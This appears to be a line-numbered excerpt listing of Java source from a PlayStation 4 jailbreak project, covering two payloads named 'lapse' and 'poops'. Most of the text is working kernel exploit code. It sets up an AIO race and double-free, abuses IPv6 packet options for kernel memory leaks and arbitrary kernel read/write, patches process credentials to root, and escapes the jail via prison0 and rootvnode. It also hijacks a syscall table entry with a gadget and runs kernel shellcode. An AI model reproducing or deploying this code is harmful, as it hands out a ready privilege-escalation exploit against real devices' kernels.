@@ -1,0 +1,588 @@
+===== payloads/lapse/src/org/bdj/external/Kernel.java =====
+6:public class Kernel {
+19:    public static class KernelAddresses {
+27:        public long kernelCr3 = 0;
+43:            kernelCr3 = 0;
+52:        void copyout(long kaddr, long uaddr, int len);
+53:        void copyin(long uaddr, long kaddr, int len);
+54:        void readBuffer(long kaddr, Buffer buf, int len);
+55:        void writeBuffer(long kaddr, Buffer buf, int len);
+57:        long kread8(long addr);
+58:        void kwrite8(long addr, long val);
+59:        int kread32(long addr);
+60:        void kwrite32(long addr, int val);
+63:    // Global kernel R/W instance
+64:    public static KernelInterface kernelRW = null;
+66:    // Kernel read/write primitives
+67:    public static class KernelRW implements KernelInterface {
+74:        // Pipe-based kernel R/W 
+79:        private Buffer readMem;
+90:            this.readMem = new Buffer(0x1000);
+102:                    Status.println("Pipe-based kernel R/W initialized successfully");
+103:                    kernelRW = this;
+114:            long result = Helper.syscall(Helper.SYS_PIPE, fildes.address());
+118:                Status.println("Created pipe pair: read=" + pipeReadFd + ", write=" + pipeWriteFd);
+151:        public void copyout(long kaddr, long uaddr, int len) {
+162:            Helper.syscall(Helper.SYS_READ, (long)pipeReadFd, uaddr, (long)len);
+165:        public void copyin(long uaddr, long kaddr, int len) {
+176:            Helper.syscall(Helper.SYS_WRITE, (long)pipeWriteFd, uaddr, (long)len);
+179:        public void readBuffer(long kaddr, Buffer buf, int len) {
+180:            Buffer mem = readMem;
+181:            copyout(kaddr, mem.address(), len);
+187:        public void writeBuffer(long kaddr, Buffer buf, int len) {
+188:            copyin(buf.address(), kaddr, len);
+214:        public long kread8(long addr) {
+216:            readBuffer(addr, buf, 8);
+220:        public void kwrite8(long addr, long val) {
+223:            writeBuffer(addr, buf, 8);
+226:        public int kread32(long addr) {
+228:            readBuffer(addr, buf, 4);
+232:        public void kwrite32(long addr, int val) {
+235:            writeBuffer(addr, buf, 4);
+240:    public static String readNullTerminatedString(long kaddr) {
+249:            long value = kernelRW.kread8(kaddr);
+269:    public static long slowKread8(int masterSock, Buffer pktinfo, int pktinfoLen, Buffer readBuf, long addr) {
+271:        int offset = 0;
+274:            readBuf.putByte(i, (byte)0);
+277:        while (offset < len) {
+278:            pktinfo.putLong(8, addr + offset);
+281:            Buffer tempBuf = new Buffer(len - offset);
+282:            int n = Helper.getSockOpt(masterSock, Helper.IPPROTO_IPV6, Helper.IPV6_NEXTHOP, tempBuf, len - offset);
+285:                readBuf.putByte(offset, (byte)0);
+286:                offset++;
+289:                    readBuf.putByte(offset + i, tempBuf.getByte(i));
+291:                offset += n;
+295:        return readBuf.getLong(0);
+298:    public static long getFdDataAddrSlow(int masterSock, Buffer pktinfo, int pktinfoLen, Buffer readBuf, int sock, long curprocOfiles) {
+300:        long fileAddr = slowKread8(masterSock, pktinfo, pktinfoLen, readBuf, filedescentAddr + 0x0);
+301:        return slowKread8(masterSock, pktinfo, pktinfoLen, readBuf, fileAddr + 0x0);
+310:        long proc = kernelRW.kread8(addr.allproc);
+314:            String procName = readNullTerminatedString(proc + KernelOffset.PROC_COMM);
+318:            proc = kernelRW.kread8(proc + 0x0);
+331:        long proc = kernelRW.kread8(addr.allproc);
+335:            int procPid = kernelRW.kread32(proc + KernelOffset.PROC_PID);
+339:            proc = kernelRW.kread8(proc + 0x0);
+347:        long vmspace = kernelRW.kread8(proc + KernelOffset.PROC_VM_SPACE);
+348:        long pmapStore = kernelRW.kread8(vmspace + KernelOffset.VMSPACE_VM_PMAP);
+349:        return kernelRW.kread8(pmapStore + KernelOffset.PMAP_CR3);
+354:            cr3 = addr.kernelCr3;
+387:        long pml4e = kernelRW.kread8(physToDmap(cr3) + pml4eIndex * 8);
+395:        long pdpe = kernelRW.kread8(pdpeVa);
+404:        long pde = kernelRW.kread8(pdeVa);
+418:        long pte = kernelRW.kread8(pteVa);
+431:            Status.println("ERROR: Required kernel addresses not set");
+438:        String evfString = readNullTerminatedString(evfPtr);
+440:            Status.println("ERROR: Failed to read EVF string - got: " + evfString);
+463:        long headerValue = kernelRW.kread8(addr.dataBase);
+470:        Status.println("ELF header bytes at " + Long.toHexString(addr.dataBase) + ":");
+477:            Status.println("ELF header verified KBASE is valid");
+480:            Status.println("ELF header mismatch check base address");
+498:        long procFd = kernelRW.kread8(curproc + KernelOffset.PROC_FD);
+499:        long ucred = kernelRW.kread8(curproc + OFFSET_P_UCRED);
+501:        if ((procFd >>> 48) != 0xFFFF || (ucred >>> 48) != 0xFFFF) {
+502:            Status.println("ERROR: Invalid kernel addresses - procFd: " + Long.toHexString(procFd) + 
+503:                          ", ucred: " + Long.toHexString(ucred));
+507:        Status.println("Patching ucred at " + Long.toHexString(ucred));
+509:        kernelRW.kwrite32(ucred + 0x04, 0); // cr_uid
+510:        kernelRW.kwrite32(ucred + 0x08, 0); // cr_ruid
+511:        kernelRW.kwrite32(ucred + 0x0C, 0); // cr_svuid
+512:        kernelRW.kwrite32(ucred + 0x10, 1); // cr_ngroups
+513:        kernelRW.kwrite32(ucred + 0x14, 0); // cr_rgid
+515:        long prison0 = kernelRW.kread8(PRISON0);
+520:        kernelRW.kwrite8(ucred + 0x30, prison0);
+523:        kernelRW.kwrite8(ucred + 0x60, -1);
+524:        kernelRW.kwrite8(ucred + 0x68, -1);
+526:        long rootvnode = kernelRW.kread8(ROOTVNODE);
+527:        if ((rootvnode >>> 48) != 0xFFFF) {
+528:            Status.println("ERROR: Invalid rootvnode address: " + Long.toHexString(rootvnode));
+531:        kernelRW.kwrite8(procFd + 0x10, rootvnode); // fd_rdir
+532:        kernelRW.kwrite8(procFd + 0x18, rootvnode); // fd_jdir
+540:        Status.println("Applying kernel patches...");
+544:            Status.println("Skipping kernel patches due to missing kernel patches shellcode.");
+548:        Status.println("File read to address: 0x0, " + shellcode.length + " bytes");
+554:        int syNarg = kernelRW.kread32(sysent661Addr);
+555:        long syCall = kernelRW.kread8(sysent661Addr + 8);
+556:        int syThrcnt = kernelRW.kread32(sysent661Addr + 0x2c);
+558:        kernelRW.kwrite32(sysent661Addr, 2);
+559:        kernelRW.kwrite8(sysent661Addr + 8, addr.dataBase + KernelOffset.getPS4Offset("JMP_RSI_GADGET"));
+560:        kernelRW.kwrite32(sysent661Addr + 0x2c, 1);
+571:        long execHandle = Helper.syscall(Helper.SYS_JITSHM_CREATE, 0L, (long)alignedMemsz, (long)PROT_RWX);
+573:        // create shm alias with write permission
+574:        long writeHandle = Helper.syscall(Helper.SYS_JITSHM_ALIAS, execHandle, (long)PROT_RW);
+576:        // map shadow mapping and write into it
+577:        Helper.syscall(Helper.SYS_MMAP, shadowMappingAddr, (long)alignedMemsz, (long)PROT_RW, 0x11L, writeHandle, 0L);
+580:            api.write8(shadowMappingAddr + i, shellcode[i]);
+584:        Helper.syscall(Helper.SYS_MMAP, mappingAddr, (long)alignedMemsz, (long)PROT_RWX, 0x11L, execHandle, 0L);
+585:        Status.println("First bytes: 0x" + Integer.toHexString(api.read32(mappingAddr)));
+587:        Helper.syscall(Helper.SYS_KEXEC, mappingAddr);
+591:        kernelRW.kwrite32(sysent661Addr, syNarg);
+592:        kernelRW.kwrite8(sysent661Addr + 8, syCall);
+593:        kernelRW.kwrite32(sysent661Addr + 0x2c, syThrcnt);
+595:        Helper.syscall(Helper.SYS_CLOSE, writeHandle);
+614:        return kernelRW != null && addr.isInitialized();
+===== payloads/lapse/src/org/bdj/external/KernelOffset.java =====
+6:public class KernelOffset {
+113:    private static void addFirmwareOffsets(String fw, long evf, long prison0, long rootvnode, 
+115:        Hashtable offsets = new Hashtable();
+116:        offsets.put("EVF_OFFSET", new Long(evf));
+117:        offsets.put("PRISON0", new Long(prison0));
+118:        offsets.put("ROOTVNODE", new Long(rootvnode));
+119:        offsets.put("TARGET_ID_OFFSET", new Long(targetId));
+120:        offsets.put("SYSENT_661_OFFSET", new Long(sysent661));
+121:        offsets.put("JMP_RSI_GADGET", new Long(jmpRsi));
+122:        ps4KernelOffsets.put(fw, offsets);
+136:    public static long getPS4Offset(String offsetName) {
+138:        Hashtable offsets = (Hashtable)ps4KernelOffsets.get(fw);
+139:        if (offsets == null) {
+140:            throw new RuntimeException("No offsets available for firmware " + fw);
+143:        Long offset = (Long)offsets.get(offsetName);
+144:        if (offset == null) {
+145:            throw new RuntimeException("Offset " + offsetName + " not found for firmware " + fw);
+148:        return offset.longValue();
+===== payloads/lapse/src/org/bdj/external/Lapse.java =====
+31:public class Lapse{
+53:    private static Kernel.KernelRW kernelRW;
+58:    private static long kernelAddr;
+75:    // Worker thread for AIO deletion race
+76:    public static class DeleteWorkerThread extends Thread {
+80:        private volatile boolean ready = false;
+84:        public DeleteWorkerThread(long requestAddr, Buffer errors, int pipeFd) {
+92:                ready = true;
+94:                // Block on pipe read
+96:                Helper.syscall(Helper.SYS_READ, (long)pipeFd, pipeBuf.address(), 1L);
+105:                Status.println("Worker thread error: " + e.getMessage());
+111:        public boolean isReady() { return ready; }
+166:                int offset = i * 0x28;
+167:                blockReqs.putInt(offset + 0x08, 1);         // nbyte
+168:                blockReqs.putInt(offset + 0x20, blockFd);   // fd = blockFd
+218:            long result = Helper.syscall(Helper.SYS_SOCKETPAIR, (long)Helper.AF_UNIX, 
+283:            long bindResult = Helper.syscall(Helper.SYS_BIND, (long)listenSd, serverAddr.address(), 16L);
+286:                Helper.syscall(Helper.SYS_CLOSE, (long)listenSd);
+290:            long listenResult = Helper.syscall(Helper.SYS_LISTEN, (long)listenSd, 1L);
+293:                Helper.syscall(Helper.SYS_CLOSE, (long)listenSd);
+309:                long connectResult = Helper.syscall(Helper.SYS_CONNECT, (long)clientSd, 
+313:                    Helper.syscall(Helper.SYS_CLOSE, (long)clientSd);
+317:                long connSd = Helper.syscall(Helper.SYS_ACCEPT, (long)listenSd, 0L, 0L);
+320:                    Helper.syscall(Helper.SYS_CLOSE, (long)clientSd);
+343:                    Helper.syscall(Helper.SYS_CLOSE, (long)clientSd);
+344:                    Helper.syscall(Helper.SYS_CLOSE, connSd);
+353:                Helper.syscall(Helper.SYS_CLOSE, (long)clientSd);
+361:                Helper.syscall(Helper.SYS_CLOSE, connSd);
+366:                    Helper.syscall(Helper.SYS_CLOSE, (long)listenSd);
+372:                        Thread.sleep(10);
+379:            Helper.syscall(Helper.SYS_CLOSE, (long)listenSd);
+397:            long pipeResult = Helper.syscall(Helper.SYS_SOCKETPAIR, (long)Helper.AF_UNIX, 
+406:            // Start worker thread
+407:            DeleteWorkerThread worker = new DeleteWorkerThread(requestAddr, sceErrs, pipeReadFd);
+410:            // Wait for worker to be ready
+413:                Thread.yield();
+418:                Helper.syscall(Helper.SYS_CLOSE, (long)pipeReadFd);
+419:                Helper.syscall(Helper.SYS_CLOSE, (long)pipeWriteFd);
+425:            Helper.syscall(Helper.SYS_WRITE, (long)pipeWriteFd, pipeBuf.address(), 1L);
+428:            Thread.yield();
+472:                        Helper.syscall(Helper.SYS_CLOSE, (long)pipeReadFd);
+473:                        Helper.syscall(Helper.SYS_CLOSE, (long)pipeWriteFd);
+488:            Helper.syscall(Helper.SYS_CLOSE, (long)pipeReadFd);
+489:            Helper.syscall(Helper.SYS_CLOSE, (long)pipeWriteFd);
+548:        Buffer tclass = new Buffer(4);
+585:                            Status.println("Aliased pktopts at attempt: " + loop + " (found pair: " + sds[i-1] + " " + sds[aliasedIdx] + ")");
+616:    public static boolean verifyReqs2(Buffer buf, int offset, int cmd) {
+619:            int actualCmd = buf.getInt(offset);
+628:            // Check if offsets 0x10 to 0x20 look like kernel heap addresses
+630:                short highWord = buf.getShort(offset + i + 6);
+635:                    heapPrefixes[prefixCount++] = buf.getShort(offset + i + 4) & 0xffff;
+640:            int state1 = buf.getInt(offset + 0x38);
+641:            int state2 = buf.getInt(offset + 0x38 + 4);
+647:            long filePtr = buf.getLong(offset + 0x40);
+652:            // Check if offsets 0x48 to 0x50 look like kernel addresses
+654:                short highWord = buf.getShort(offset + i + 6);
+656:                    short midWord = buf.getShort(offset + i + 4);
+660:                } else if ((i == 0x48) || (buf.getLong(offset + i) != 0)) {
+684:    // STAGE 2: Leak kernel addresses
+686:        Status.println("=== STAGE 2: Leak kernel addresses ===");
+699:            Helper.syscall(Helper.SYS_CLOSE, (long)aliasedPair[1]);
+761:            // evf.cv.cv_description = "evf cv" - string is located at the kernel's mapped ELF file
+762:            kernelAddr = buf.getLong(0x28);
+763:            Status.println("\"evf cv\" string addr: " + Long.toHexString(kernelAddr));
+786:            long ucred = kbufAddr + 4;
+788:            leakReqs.putLong(0x10, ucred);  // .ai_cred
+809:                // Out of bound read on adjacent malloc 0x80 memory
+854:            Status.println("reqs2 offset: " + Integer.toHexString((int)reqs2Off));
+855:            Status.println("fake reqs3 offset: " + Integer.toHexString((int)fakeReqs3Off));
+938:        Status.println("Start overwrite rthdr with AIO queue entry loop");
+960:            Status.println("Failed to overwrite rthdr");
+980:        Status.println("Start overwrite AIO queue entry with rthdr loop");
+982:        Helper.syscall(Helper.SYS_CLOSE, (long)aliasedSd);
+984:        int reqId = overwriteAioEntryWithRthdr(sockets, reqs2, rsize, addrCache, numElems, states, aioIds.address());
+987:            Status.println("Failed to overwrite AIO queue entry");
+999:        Status.println("Freeing all pktopts to prepare 0x100 zone for reclaim");
+1000:        int pktoptsFreed = 0;
+1005:                    pktoptsFreed++;
+1011:        Status.println("Pktopts freed: " + pktoptsFreed + "/" + socketsAlt.length);
+1060:            Status.println("Failed to make aliased pktopts despite successful double-free");
+1079:    private static int overwriteAioEntryWithRthdr(int[] sds, Buffer reqs2, int rsize,
+1124:                        int reqId = api.read32(reqIdP);
+1132:                        api.write32(reqIdP, 0);
+1146:    // STAGE 4: Get arbitrary kernel read/write
+1147:    public static boolean executeStage4(int[] pktoptsSds, long k100Addr, long kernelAddr,
+1149:        Status.println("=== STAGE 4: Get arbitrary kernel read/write ===");
+1151:        int masterSock = pktoptsSds[0];
+1152:        Buffer tclass = new Buffer(4);
+1153:        int offTclass = KernelOffset.PS4_OFF_TCLASS;
+1155:        int pktoptsSize = 0x100;
+1156:        Buffer pktopts = new Buffer(pktoptsSize);
+1157:        int rsize = Helper.buildRoutingHeader(pktopts, pktoptsSize);
+1160:        // pktopts.ip6po_pktinfo = &pktopts.ip6po_pktinfo
+1161:        pktopts.putLong(0x10, pktinfoP);
+1163:        Status.println("Overwrite main pktopts");
+1166:        Helper.syscall(Helper.SYS_CLOSE, (long)pktoptsSds[1]);
+1172:                    pktopts.putInt(offTclass, marker);
+1173:                    Helper.setRthdr(sdsAlt[j], pktopts, rsize);
+1191:            Status.println("Failed to overwrite main pktopts");
+1199:        Buffer readBuf = new Buffer(8);
+1201:        // Slow kernel read implementation
+1202:        Status.println("Implementing slow kernel read");
+1204:        // Test read the "evf cv" string
+1205:        long testValue = Kernel.slowKread8(masterSock, pktinfo, pktinfoLen, readBuf, kernelAddr);
+1206:        String testStr = Helper.extractStringFromBuffer(readBuf);
+1207:        Status.println("slowKread8(\"evf cv\"): " + Long.toHexString(testValue));
+1211:            Status.println("Test read of \"evf cv\" failed");
+1215:        Status.println("Slow arbitrary kernel read achieved");
+1217:        // Find curproc from previously freed aio_info using correct offset
+1218:        long curproc = Kernel.slowKread8(masterSock, pktinfo, pktinfoLen, readBuf, aioInfoAddr + 8);
+1221:            Status.println("Invalid curproc kernel address: " + Long.toHexString(curproc));
+1225:        // Verify curproc by checking PID with correct offset
+1226:        long possiblePid = Kernel.slowKread8(masterSock, pktinfo, pktinfoLen, readBuf, curproc + KernelOffset.PROC_PID);
+1227:        long currentPid = Helper.syscall(Helper.SYS_GETPID);
+1239:        // Store kernel addresses
+1241:        Kernel.addr.insideKdata = kernelAddr;
+1243:        // Use slow kernel read for address resolution
+1244:        long curprocFd = Kernel.slowKread8(masterSock, pktinfo, pktinfoLen, readBuf, curproc + KernelOffset.PROC_FD);
+1245:        long curprocOfiles = Kernel.slowKread8(masterSock, pktinfo, pktinfoLen, readBuf, curprocFd) + KernelOffset.FILEDESC_OFILES;
+1254:        // Create pktopts on worker_sock
+1257:        // Get worker socket's pktopts address using slow read
+1258:        long workerFdData = Kernel.getFdDataAddrSlow(masterSock, pktinfo, pktinfoLen, readBuf, workerSock, curprocOfiles);
+1259:        long workerPcb = Kernel.slowKread8(masterSock, pktinfo, pktinfoLen, readBuf, workerFdData + KernelOffset.SO_PCB);
+1260:        long workerPktopts = Kernel.slowKread8(masterSock, pktinfo, pktinfoLen, readBuf, workerPcb + KernelOffset.INPCB_PKTOPTS);
+1264:        Status.println("worker_pktopts = " + Long.toHexString(workerPktopts));
+1266:        // Initialize fast kernel R/W
+1267:        kernelRW = new Kernel.KernelRW(masterSock, workerSock, curprocOfiles);
+1268:        kernelRW.setupPktinfo(workerPktopts);
+1270:        Kernel.setKernelAddresses(curproc, curprocOfiles, kernelAddr, 0);
+1272:        Status.println("Arbitrary kernel r/w achieved!");
+1282:                long sockPktopts = kernelRW.getSockPktopts(sds[i]);
+1283:                kernelRW.kwrite8(sockPktopts + offIp6poRthdr, 0);
+1287:        long reclaimerPktopts = kernelRW.getSockPktopts(reclaimSock);
+1288:        kernelRW.kwrite8(reclaimerPktopts + offIp6poRthdr, 0);
+1290:        long workerPktoptsAddr = kernelRW.getSockPktopts(workerSock);
+1291:        kernelRW.kwrite8(workerPktoptsAddr + offIp6poRthdr, 0);
+1297:            long sockAddr = kernelRW.getFdDataAddr(sockIncreaseRef[i]);
+1298:            kernelRW.kwrite32(sockAddr + 0x0, 0x100);  // so_count
+1313:                Helper.syscall(Helper.SYS_CLOSE, (long)blockFd);
+1317:                Helper.syscall(Helper.SYS_CLOSE, (long)unblockFd);
+1355:                        Helper.syscall(Helper.SYS_CLOSE, (long)sockets[i]);
+1366:                        Helper.syscall(Helper.SYS_CLOSE, (long)socketsAlt[i]);
+1380:            // Reset kernel state
+1384:            kernelRW = null;
+1404:                NativeInvoke.sendNotificationRequest("Already Jailbroken");
+1405:                Status.println("Already Jailbroken");
+1438:                Status.println("FAILED: Stage 2 kernel address leaking failed");
+1445:            int[] pktoptsSds = executeStage3(aliasedPair[0]);
+1446:            if (pktoptsSds == null) {
+1452:            Helper.syscall(Helper.SYS_CLOSE, (long)fakeReqs3Sd);
+1455:            if (!executeStage4(pktoptsSds, reqs1Addr, kernelAddr, sockets, socketsAlt, aioInfoAddr)) {
+1456:                Status.println("FAILED: Stage 4 arbitrary kernel read/write failed");
+===== payloads/poops/src/org/bdj/external/Kernel.java =====
+6:public class Kernel {
+19:    public static class KernelAddresses {
+27:        public long kernelCr3 = 0;
+43:            kernelCr3 = 0;
+52:        void copyout(long kaddr, long uaddr, int len);
+53:        void copyin(long uaddr, long kaddr, int len);
+54:        void readBuffer(long kaddr, Buffer buf, int len);
+55:        void writeBuffer(long kaddr, Buffer buf, int len);
+57:        long kread8(long addr);
+58:        void kwrite8(long addr, long val);
+59:        int kread32(long addr);
+60:        void kwrite32(long addr, int val);
+63:    // Global kernel R/W instance
+64:    public static KernelInterface kernelRW = null;
+66:    // Kernel read/write primitives
+67:    public static class KernelRW implements KernelInterface {
+74:        // Pipe-based kernel R/W 
+79:        private Buffer readMem;
+90:            this.readMem = new Buffer(0x1000);
+102:                    Status.println("Pipe-based kernel R/W initialized successfully");
+103:                    kernelRW = this;
+114:            long result = Helper.syscall(Helper.SYS_PIPE, fildes.address());
+118:                Status.println("Created pipe pair: read=" + pipeReadFd + ", write=" + pipeWriteFd);
+151:        public void copyout(long kaddr, long uaddr, int len) {
+162:            Helper.syscall(Helper.SYS_READ, (long)pipeReadFd, uaddr, (long)len);
+165:        public void copyin(long uaddr, long kaddr, int len) {
+176:            Helper.syscall(Helper.SYS_WRITE, (long)pipeWriteFd, uaddr, (long)len);
+179:        public void readBuffer(long kaddr, Buffer buf, int len) {
+180:            Buffer mem = readMem;
+181:            copyout(kaddr, mem.address(), len);
+187:        public void writeBuffer(long kaddr, Buffer buf, int len) {
+188:            copyin(buf.address(), kaddr, len);
+214:        public long kread8(long addr) {
+216:            readBuffer(addr, buf, 8);
+220:        public void kwrite8(long addr, long val) {
+223:            writeBuffer(addr, buf, 8);
+226:        public int kread32(long addr) {
+228:            readBuffer(addr, buf, 4);
+232:        public void kwrite32(long addr, int val) {
+235:            writeBuffer(addr, buf, 4);
+240:    public static String readNullTerminatedString(long kaddr) {
+249:            long value = kernelRW.kread8(kaddr);
+269:    public static long slowKread8(int masterSock, Buffer pktinfo, int pktinfoLen, Buffer readBuf, long addr) {
+271:        int offset = 0;
+274:            readBuf.putByte(i, (byte)0);
+277:        while (offset < len) {
+278:            pktinfo.putLong(8, addr + offset);
+281:            Buffer tempBuf = new Buffer(len - offset);
+282:            int n = Helper.getSockOpt(masterSock, Helper.IPPROTO_IPV6, Helper.IPV6_NEXTHOP, tempBuf, len - offset);
+285:                readBuf.putByte(offset, (byte)0);
+286:                offset++;
+289:                    readBuf.putByte(offset + i, tempBuf.getByte(i));
+291:                offset += n;
+295:        return readBuf.getLong(0);
+298:    public static long getFdDataAddrSlow(int masterSock, Buffer pktinfo, int pktinfoLen, Buffer readBuf, int sock, long curprocOfiles) {
+300:        long fileAddr = slowKread8(masterSock, pktinfo, pktinfoLen, readBuf, filedescentAddr + 0x0);
+301:        return slowKread8(masterSock, pktinfo, pktinfoLen, readBuf, fileAddr + 0x0);
+310:        long proc = kernelRW.kread8(addr.allproc);
+314:            String procName = readNullTerminatedString(proc + KernelOffset.PROC_COMM);
+318:            proc = kernelRW.kread8(proc + 0x0);
+331:        long proc = kernelRW.kread8(addr.allproc);
+335:            int procPid = kernelRW.kread32(proc + KernelOffset.PROC_PID);
+339:            proc = kernelRW.kread8(proc + 0x0);
+347:        long vmspace = kernelRW.kread8(proc + KernelOffset.PROC_VM_SPACE);
+348:        long pmapStore = kernelRW.kread8(vmspace + KernelOffset.VMSPACE_VM_PMAP);
+349:        return kernelRW.kread8(pmapStore + KernelOffset.PMAP_CR3);
+354:            cr3 = addr.kernelCr3;
+387:        long pml4e = kernelRW.kread8(physToDmap(cr3) + pml4eIndex * 8);
+395:        long pdpe = kernelRW.kread8(pdpeVa);
+404:        long pde = kernelRW.kread8(pdeVa);
+418:        long pte = kernelRW.kread8(pteVa);
+431:            Status.println("ERROR: Required kernel addresses not set");
+438:        String evfString = readNullTerminatedString(evfPtr);
+440:            Status.println("ERROR: Failed to read EVF string - got: " + evfString);
+463:        long headerValue = kernelRW.kread8(addr.dataBase);
+470:        Status.println("ELF header bytes at " + Long.toHexString(addr.dataBase) + ":");
+477:            Status.println("ELF header verified KBASE is valid");
+480:            Status.println("ELF header mismatch check base address");
+498:        long procFd = kernelRW.kread8(curproc + KernelOffset.PROC_FD);
+499:        long ucred = kernelRW.kread8(curproc + OFFSET_P_UCRED);
+501:        if ((procFd >>> 48) != 0xFFFF || (ucred >>> 48) != 0xFFFF) {
+502:            Status.println("ERROR: Invalid kernel addresses - procFd: " + Long.toHexString(procFd) + 
+503:                          ", ucred: " + Long.toHexString(ucred));
+507:        Status.println("Patching ucred at " + Long.toHexString(ucred));
+509:        kernelRW.kwrite32(ucred + 0x04, 0); // cr_uid
+510:        kernelRW.kwrite32(ucred + 0x08, 0); // cr_ruid
+511:        kernelRW.kwrite32(ucred + 0x0C, 0); // cr_svuid
+512:        kernelRW.kwrite32(ucred + 0x10, 1); // cr_ngroups
+513:        kernelRW.kwrite32(ucred + 0x14, 0); // cr_rgid
+515:        long prison0 = kernelRW.kread8(PRISON0);
+520:        kernelRW.kwrite8(ucred + 0x30, prison0);
+523:        kernelRW.kwrite8(ucred + 0x60, -1);
+524:        kernelRW.kwrite8(ucred + 0x68, -1);
+526:        long rootvnode = kernelRW.kread8(ROOTVNODE);
+527:        if ((rootvnode >>> 48) != 0xFFFF) {
+528:            Status.println("ERROR: Invalid rootvnode address: " + Long.toHexString(rootvnode));
+531:        kernelRW.kwrite8(procFd + 0x10, rootvnode); // fd_rdir
+532:        kernelRW.kwrite8(procFd + 0x18, rootvnode); // fd_jdir
+540:        Status.println("Applying kernel patches...");
+544:            Status.println("Skipping kernel patches due to missing kernel patches shellcode.");
+548:        Status.println("File read to address: 0x0, " + shellcode.length + " bytes");
+554:        int syNarg = kernelRW.kread32(sysent661Addr);
+555:        long syCall = kernelRW.kread8(sysent661Addr + 8);
+556:        int syThrcnt = kernelRW.kread32(sysent661Addr + 0x2c);
+558:        kernelRW.kwrite32(sysent661Addr, 2);
+559:        kernelRW.kwrite8(sysent661Addr + 8, addr.dataBase + KernelOffset.getPS4Offset("JMP_RSI_GADGET"));
+560:        kernelRW.kwrite32(sysent661Addr + 0x2c, 1);
+571:        long execHandle = Helper.syscall(Helper.SYS_JITSHM_CREATE, 0L, (long)alignedMemsz, (long)PROT_RWX);
+573:        // create shm alias with write permission
+574:        long writeHandle = Helper.syscall(Helper.SYS_JITSHM_ALIAS, execHandle, (long)PROT_RW);
+576:        // map shadow mapping and write into it
+577:        Helper.syscall(Helper.SYS_MMAP, shadowMappingAddr, (long)alignedMemsz, (long)PROT_RW, 0x11L, writeHandle, 0L);
+580:            api.write8(shadowMappingAddr + i, shellcode[i]);
+584:        Helper.syscall(Helper.SYS_MMAP, mappingAddr, (long)alignedMemsz, (long)PROT_RWX, 0x11L, execHandle, 0L);
+585:        Status.println("First bytes: 0x" + Integer.toHexString(api.read32(mappingAddr)));
+587:        Helper.syscall(Helper.SYS_KEXEC, mappingAddr);
+591:        kernelRW.kwrite32(sysent661Addr, syNarg);
+592:        kernelRW.kwrite8(sysent661Addr + 8, syCall);
+593:        kernelRW.kwrite32(sysent661Addr + 0x2c, syThrcnt);
+595:        Helper.syscall(Helper.SYS_CLOSE, writeHandle);
+614:        return kernelRW != null && addr.isInitialized();
+===== payloads/poops/src/org/bdj/external/KernelOffset.java =====
+6:public class KernelOffset {
+125:    private static void addFirmwareOffsets(String fw, long evf, long prison0, long rootvnode, 
+127:        Hashtable offsets = new Hashtable();
+128:        offsets.put("EVF_OFFSET", new Long(evf));
+129:        offsets.put("PRISON0", new Long(prison0));
+130:        offsets.put("ROOTVNODE", new Long(rootvnode));
+131:        offsets.put("TARGET_ID_OFFSET", new Long(targetId));
+132:        offsets.put("SYSENT_661_OFFSET", new Long(sysent661));
+133:        offsets.put("JMP_RSI_GADGET", new Long(jmpRsi));
+134:        offsets.put("KL_LOCK", new Long(klLock));
+135:        ps4KernelOffsets.put(fw, offsets);
+149:    public static long getPS4Offset(String offsetName) {
+151:        Hashtable offsets = (Hashtable)ps4KernelOffsets.get(fw);
+152:        if (offsets == null) {
+153:            throw new RuntimeException("No offsets available for firmware " + fw);
+156:        Long offset = (Long)offsets.get(offsetName);
+157:        if (offset == null) {
+158:            throw new RuntimeException("Offset " + offsetName + " not found for firmware " + fw);
+161:        return offset.longValue();
+===== payloads/poops/src/org/bdj/external/Poops.java =====
+8:public class Poops {
+53:    private static long read;
+54:    private static long readv;
+55:    private static long write;
+56:    private static long writev;
+88:    private static IovThread[] iovThreads = new IovThread[IOV_THREAD_NUM];
+89:    private static UioThread[] uioThreads = new UioThread[UIO_THREAD_NUM];
+122:    private static Kernel.KernelRW kernelRW;
+139:    private static long read(int fd, Buffer buf, long nbytes) {
+140:        return Helper.api.call(read, fd, buf != null ? buf.address() : 0, nbytes);
+143:    private static long readv(int fd, Buffer iov, int iovcnt) {
+144:        return Helper.api.call(readv, fd, iov != null ? iov.address() : 0, iovcnt);
+147:    private static long write(int fd, Buffer buf, long nbytes) {
+148:        return Helper.api.call(write, fd, buf != null ? buf.address() : 0, nbytes);
+151:    private static long writev(int fd, Buffer iov, int iovcnt) {
+152:        return Helper.api.call(writev, fd, iov != null ? iov.address() : 0, iovcnt);
+227:            if (iovThreads[i] != null) {
+228:                iovThreads[i].interrupt();
+230:                    iovThreads[i].join();
+236:            if (iovThreads[i] != null) {
+237:                uioThreads[i].interrupt();
+239:                    uioThreads[i].join();
+272:    private static void buildUio(Buffer uio, long uio_iov, long uio_td, boolean read, long addr, long size) {
+275:        uio.putLong(0x10, 0xFFFFFFFFFFFFFFFFL); // uio_offset
+278:        uio.putInt(0x24, read ? UIO_WRITE : UIO_READ); // uio_segflg
+284:    private static Buffer kreadSlow(long addr, int size) {
+291:        write(uioSs1, tmp, size);
+302:            read(uioSs0, tmp, size);
+304:                read(uioSs0, leakBuffers[i], leakBuffers[i].size());
+307:            write(uioSs1, tmp, size);
+320:            write(iovSs1, tmp, Int8.SIZE);
+322:            read(iovSs0, tmp, Int8.SIZE);
+324:        read(uioSs0, tmp, size);
+327:            read(uioSs0, leakBuffers[i], leakBuffers[i].size());
+331:                    Status.println("kreadSlow triplet failure 1");
+338:        write(iovSs1, tmp, Int8.SIZE);
+341:            Status.println("kreadSlow triplet failure 2");
+345:        read(iovSs0, tmp, Int8.SIZE);
+349:    private static boolean kwriteSlow(long addr, Buffer buffer) {
+363:                write(uioSs1, buffer, buffer.size());
+378:            write(iovSs1, tmp, Int8.SIZE);
+380:            read(iovSs0, tmp, Int8.SIZE);
+383:            write(uioSs1, buffer, buffer.size());
+387:            Status.println("kwriteSlow triplet failure 1");
+391:        write(iovSs1, tmp, Int8.SIZE);
+394:            Status.println("kwriteSlow triplet failure 2");
+398:        read(iovSs0, tmp, Int8.SIZE);
+408:            read = Helper.api.dlsym(Helper.api.LIBKERNEL_MODULE_HANDLE, "read");
+409:            readv = Helper.api.dlsym(Helper.api.LIBKERNEL_MODULE_HANDLE, "readv");
+410:            write = Helper.api.dlsym(Helper.api.LIBKERNEL_MODULE_HANDLE, "write");
+411:            writev = Helper.api.dlsym(Helper.api.LIBKERNEL_MODULE_HANDLE, "writev");
+426:            if (dup == 0 || close == 0 || read == 0 || readv == 0 || write == 0 || writev == 0 || ioctl == 0
+468:            // Create iov threads.
